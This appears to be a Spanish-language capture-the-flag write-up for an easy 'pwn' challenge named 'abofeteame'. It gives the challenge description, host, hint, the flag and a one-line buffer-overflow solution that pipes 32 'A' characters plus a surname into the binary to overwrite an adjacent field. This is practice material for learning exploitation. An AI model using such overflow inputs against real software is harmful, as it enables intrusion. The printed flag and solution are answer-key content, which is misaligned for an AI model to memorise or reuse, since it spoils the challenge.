# Nombre: `abofeteame`
### Dificultad: `fácil`
### Categoría: `pwn`
### Autor: [Cae](https://c4ebt.github.io/)
### Flag: `DCCTF{b0f_l4_b4se_d3_t0d0_3xpl0it}`

### Descripción:
La reina ha muerto, dejando tras de si un sinnúmero de secretos a los que solo la realeza puede acceder a través de este portal. Podrás hackearlo? `chall.dcctf.xyz:5001`

### Hint 1:
`buffer overflow`

### Solución:
Overflow al buffer de nombre para sobreescribir el apellido.
`python -c 'print("A"*32+"Pérez")' | ./realeza`
